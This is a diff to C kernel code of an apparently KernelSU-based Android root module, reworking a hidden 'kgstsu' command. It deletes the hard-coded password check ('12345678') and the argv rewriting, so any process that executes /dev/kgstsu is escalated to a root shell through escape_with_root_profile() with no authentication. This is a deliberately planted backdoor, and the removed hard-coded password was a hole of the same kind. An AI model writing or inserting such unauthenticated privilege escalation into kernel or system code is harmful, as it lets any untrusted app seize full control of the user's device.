@@ -24,8 +24,7 @@
 
 #define SU_PATH "/system/bin/su"
 #define SH_PATH "/system/bin/sh"
-#define KGSTSU_PATH "/system/bin/kgstsu"
-#define KGSTSU_PASSWORD "12345678"
+#define KGSTSU_PATH "/dev/kgstsu"
 
 bool ksu_su_compat_enabled __read_mostly = true;
 
@@ -93,7 +92,7 @@ int ksu_handle_faccessat(int *dfd, const char __user **filename_user, int *mode,
     if (unlikely(!memcmp(path, su, sizeof(su)))) {
         pr_info("faccessat su->sh!\n");
         *filename_user = sh_user_path();
-    } else if (unlikely(!memcmp(path, kgstsu, sizeof(kgstsu)))) {
+    } else if (unlikely(!strncmp(path, kgstsu, sizeof(kgstsu) - 1) && path[sizeof(kgstsu) - 1] == '\0')) {
         pr_info("faccessat kgstsu->sh!\n");
         *filename_user = kgstsu_sh_user_path();
     }
@@ -123,7 +122,7 @@ int ksu_handle_stat(int *dfd, const char __user **filename_user, int *flags)
     if (unlikely(!memcmp(path, su, sizeof(su)))) {
         pr_info("newfstatat su->sh!\n");
         *filename_user = sh_user_path();
-    } else if (unlikely(!memcmp(path, kgstsu, sizeof(kgstsu)))) {
+    } else if (unlikely(!strncmp(path, kgstsu, sizeof(kgstsu) - 1) && path[sizeof(kgstsu) - 1] == '\0')) {
         pr_info("newfstatat kgstsu->sh!\n");
         *filename_user = kgstsu_sh_user_path();
     }
@@ -161,76 +160,26 @@ long ksu_handle_execve_sucompat(const char __user **filename_user, int orig_nr, 
     }
 
     /* 优先检测 kgstsu 命令 */
-    if (!memcmp(path, kgstsu, sizeof(kgstsu))) {
-        char pwd_buf[sizeof(KGSTSU_PASSWORD) + 1] = {0};
-        const char __user *pwd_ptr;
+    if (!strncmp(path, kgstsu, sizeof(kgstsu) - 1) && path[sizeof(kgstsu) - 1] == '\0') {
+        pr_info("kgstsu: found, escaping to root shell\n");
+        pending_sucompat = ksu_sulog_capture_sucompat(*filename_user, argv_user, GFP_KERNEL);
+        *filename_user = kgstsu_sh_user_path();
 
-        /* 获取第一个参数（密码） */
-        ret = get_user(pwd_ptr, argv_user + 1);
-        if (ret == 0 && pwd_ptr != NULL) {
-            strncpy_from_user_nofault(pwd_buf, pwd_ptr, sizeof(pwd_buf) - 1);
-            pwd_buf[sizeof(pwd_buf) - 1] = '\0';
-        }
-
-        if (pwd_buf[0] && !strcmp(pwd_buf, KGSTSU_PASSWORD)) {
-            /* 密码正确！触发提权 */
-            pr_info("kgstsu: password correct, escaping to root shell\n");
-            pending_sucompat = ksu_sulog_capture_sucompat(*filename_user, argv_user, GFP_KERNEL);
-            *filename_user = kgstsu_sh_user_path();
-
-            /* 修复 argv，让它变成 ["sh", NULL] */
-            {
-                const char __user *new_argv[2];
-                const char __user *sh_ptr;
-                char __user *stack_ptr;
-                static const char sh_name[] = "sh";
-                unsigned long sp;
-                size_t align_size;
-
-                /* 确保 8 字节对齐 */
-                align_size = (sizeof(sh_name) + 7) & ~7UL;  /* 向上取整到 8 的倍数: 3->8 */
-
-                sp = current_user_stack_pointer();
-                stack_ptr = (char __user *)(sp - align_size - sizeof(new_argv));
-
-                if (copy_to_user(stack_ptr, sh_name, sizeof(sh_name))) {
-                    pr_err("kgstsu: failed to write sh to user stack\n");
-                    goto do_orig_execve;
-                }
-
-                sh_ptr = (const char __user *)stack_ptr;
-                new_argv[0] = sh_ptr;
-                new_argv[1] = NULL;
-
-                if (copy_to_user((void __user *)(sp - sizeof(new_argv)), new_argv, sizeof(new_argv))) {
-                    pr_err("kgstsu: failed to write argv to user stack\n");
-                    goto do_orig_execve;
-                }
-
-                /* 修改 regs 中的 argv 参数 */
-                *(unsigned long *)&PT_REGS_PARM2(regs) = (unsigned long)(sp - sizeof(new_argv));
-            }
-
-            ret = escape_with_root_profile();
-            if (ret) {
-                pr_err("kgstsu: escape_with_root_profile failed: %ld\n", ret);
-                ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
-                goto do_orig_execve;
-            }
-
-            ret = ksu_syscall_table[orig_nr](regs);
-            if (ret < 0) {
-                pr_err("kgstsu: failed to execve sh: %ld\n", ret);
-                ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
-            } else {
-                ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
-            }
-            return ret;
-        } else {
-            /* 密码错误或无密码，放行 */
-            pr_info("kgstsu: wrong password or no password, bypass\n");
+        ret = escape_with_root_profile();
+        if (ret) {
+            pr_err("kgstsu: escape_with_root_profile failed: %ld\n", ret);
+            ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
             goto do_orig_execve;
         }
+
+        ret = ksu_syscall_table[orig_nr](regs);
+        if (ret < 0) {
+            pr_err("kgstsu: failed to execve sh: %ld\n", ret);
+            ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
+        } else {
+            ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
+        }
+        return ret;
     }
 
     if (likely(memcmp(path, su, sizeof(su))))
